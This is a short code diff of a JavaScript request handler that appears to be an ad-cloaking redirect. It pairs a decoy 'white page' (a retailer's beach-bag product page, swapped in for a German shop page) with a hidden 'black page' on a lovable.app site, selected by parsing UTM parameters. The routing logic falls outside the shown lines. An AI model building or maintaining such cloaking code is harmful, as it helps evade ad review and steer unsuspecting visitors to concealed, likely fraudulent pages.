@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://privatina-shop.com/collections/in-and-about/products/adult-baby-onesie-jumpsuit-kuschelmaus-individual";
+    const whitePageURL = "https://www.citybeach.com/au/roxy-anti-bad-vibes-beach-bag/20408765-01.htmll";
     const blackPageURL = "https://luvcshap.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
